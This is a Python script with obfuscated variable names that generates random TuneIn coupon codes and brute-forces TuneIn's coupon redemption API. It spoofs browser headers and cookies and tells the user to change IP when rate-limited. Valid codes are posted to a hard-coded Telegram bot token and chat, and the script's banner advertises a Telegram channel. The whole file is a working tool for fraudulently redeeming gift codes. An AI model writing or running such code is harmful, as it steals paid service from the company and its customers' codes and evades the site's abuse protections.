import requests #line:1:import requests
import time #line:2:import time
import random #line:3:import random
import string #line:4:import string
logo ='''
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
      ████████╗ ██╗░░░██╗ ███╗░░██╗ ███████╗   ██╗ ███╗░░██╗
      ╚══██╔══╝ ██║░░░██║ ████╗░██║ ██╔════╝   ██║ ████╗░██║
      ░░░██║░░░ ██║░░░██║ ██╔██╗██║ █████╗░░   ██║ ██╔██╗██║
      ░░░██║░░░ ██║░░░██║ ██║╚████║ ██╔══╝░░   ██║ ██║╚████║
      ░░░██║░░░ ╚██████╔╝ ██║░╚███║ ███████╗   ██║ ██║░╚███║
      ░░░╚═╝░░░ ░╚═════╝░ ╚═╝░░╚══╝ ╚══════╝   ╚═╝ ╚═╝░░╚══╝
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
              [+] Made By FullNoob_xD [+]
              [+] Join @ConfigsGram [+]
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
'''#line:18:'''
for N ,line in enumerate (logo .split ('\n')):#line:19:for N, line in enumerate(logo.split('\n')):
    print (line )#line:20:print(line)
    time .sleep (0.06 )#line:21:time.sleep(0.06)
def genCode ():#line:23:def genCode():
    O0000000OOOOOOOO0 =4 #line:24:codeLen = 4
    OOO0OOOO0O000OO0O =''.join (random .choices (string .ascii_lowercase +string .digits ,k =O0000000OOOOOOOO0 ))#line:25:ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = codeLen))
    O00O0O0OO000OO0O0 ="scribd-1--"+str (OOO0OOOO0O000OO0O )#line:26:code = "scribd-1--" + str(ran)
    return O00O0O0OO000OO0O0 #line:28:return code
totVal =0 #line:30:totVal = 0
def checkCode (O00OOOO0O0OO0O000 ):#line:32:def checkCode(numOfChecks):
    OOO0O0OO0OO0OOO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive','Upgrade-Insecure-Requests':'1','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1',}#line:44:}
    for OOO00O0OO0OOO000O in range (1 ,O00OOOO0O0OO0O000 +1 ):#line:45:for i in range(1, numOfChecks+1):
        OO0O00OO000O0O00O ="https://tunein.com/coupon/"#line:46:url1 = "https://tunein.com/coupon/"
        O00OO000O0O0O0O0O =requests .get (OO0O00OO000O0O00O ,headers =OOO0O0OO0OO0OOO00 ).cookies #line:47:goToUrl1 = requests.get(url1, headers=hdrs1).cookies
        O000O00OOO0OOOOO0 =O00OO000O0O0O0O0O .__getitem__ ("__cf_bm")#line:49:cf = goToUrl1.__getitem__("__cf_bm")
        O0O0OO000O000000O =O00OO000O0O0O0O0O .__getitem__ ("rtid")#line:50:uuid = goToUrl1.__getitem__("rtid")
        OOO0O000O00O0O0O0 ={'rtid':O0O0OO000O000000O ,'__cf_bm':O000O00OOO0OOOOO0 ,}#line:55:}
        O0OOO00O000000OO0 ="rtid="+str (O0O0OO000O000000O )+"; __cf_bm="+str (O000O00OOO0OOOOO0 )#line:56:cks = "rtid="+str(uuid)+"; __cf_bm="+str(cf)
        O0000O00O000OO000 ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0','Accept':'application/json, text/plain, */*','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive','Referer':'https://tunein.com/coupon/','Cookie':O0OOO00O000000OO0 ,'Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','TE':'trailers',}#line:69:}
        O00OO0O0OOO0O0O00 =genCode ()#line:70:cde = genCode()
        OOO0OOO00OO0O0000 ="https://tunein.com/api/v1/coupons/"+O00OO0O0OOO0O0O00 +"/?status=redeemable&isStripe=false&formats=mp3,aac,ogg,flash,html,hls,wma&serial="+str (O0O0OO000O000000O )+"&partnerId=RadioTime&version=5.37&itemUrlScheme=secure&reqAttempt=1"#line:71:url2 = "https://tunein.com/api/v1/coupons/"+cde+"/?status=redeemable&isStripe=false&formats=mp3,aac,ogg,flash,html,hls,wma&serial="+str(uuid)+"&partnerId=RadioTime&version=5.37&itemUrlScheme=secure&reqAttempt=1"
        O00OO0OOOOOO0OO0O =requests .get (OOO0OOO00OO0O0000 ,headers =O0000O00O000OO000 ,cookies =OOO0O000O00O0O0O0 )#line:73:goToUrl2 = requests.get(url2, headers=hdrs2, cookies=ckks)
        if O00OO0OOOOOO0OO0O .status_code ==403 :#line:78:if goToUrl2.status_code == 403:
            print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Change IP [+]")#line:79:print("["+str(i)+"] Code =", cde, "| Change IP [+]")
        elif O00OO0OOOOOO0OO0O .status_code ==400 :#line:81:elif goToUrl2.status_code == 400:
            if "maxed_out"in O00OO0OOOOOO0OO0O .text :#line:82:if "maxed_out" in goToUrl2.text:
                print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Expired [+]")#line:83:print("["+str(i)+"] Code =", cde, "| Expired [+]")
            elif "invalid"in O00OO0OOOOOO0OO0O .text :#line:84:elif "invalid" in goToUrl2.text:
                print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Invalid [+]")#line:85:print("[" + str(i) + "] Code =", cde, "| Invalid [+]")
            else :print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Unknown Error [+]")#line:86:else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")
        elif O00OO0OOOOOO0OO0O .status_code ==200 :#line:88:elif goToUrl2.status_code == 200:
            print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Valid [+]")#line:89:print("["+str(i)+"] Code =", cde, "| Valid [+]")
            OOOO00O0OOO00OOO0 ="https://api.telegram.org/bot5975477248:AAHjSm7_9Yo0GnbbDXH1iiBsl8iGt4_cjA4/sendMessage?chat_id=-1001845189936&text=Tunein.com GiftCard|| Code = "+str (O00OO0O0OOO0O0O00 )+"| Valid"#line:90:himtURL = "https://api.telegram.org/bot5975477248:AAHjSm7_9Yo0GnbbDXH1iiBsl8iGt4_cjA4/sendMessage?chat_id=-1001845189936&text=Tunein.com GiftCard|| Code = "+str(cde)+"| Valid"
            O0O0OOO0O00O0000O =requests .get (url =OOOO00O0OOO00OOO0 )#line:91:himtStelor = requests.get(url=himtURL)
        else :print ("["+str (OOO00O0OO0OOO000O )+"] Code =",O00OO0O0OOO0O0O00 ,"| Unknown Error [+]")#line:93:else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")
try :#line:95:try:
    nums =int (input ("[+] Enter the number of codes to generate and check : "))#line:96:nums = int(input("[+] Enter the number of codes to generate and check : "))
    print ("[+] Starting generator and checker.....")#line:97:print("[+] Starting generator and checker.....")
    print ("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")#line:98:print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    checkCode (nums )#line:99:checkCode(nums)
    print ("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")#line:100:print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    input ("[+] Process finished successfully! Press any key to exit!")#line:102:input("[+] Process finished successfully! Press any key to exit!")
except Exception as exc :#line:103:except Exception as exc:
    print ("Pstt!!! Unknown error occured. Try running again or contact owner.\nReason of error: ",exc )#line:104:print("Pstt!!! Unknown error occured. Try running again or contact owner.\nReason of error: ",exc)
    input ("[+] Process finished successfully! Press any key to exit!")#line:105:input("[+] Process finished successfully! Press any key to exit!")
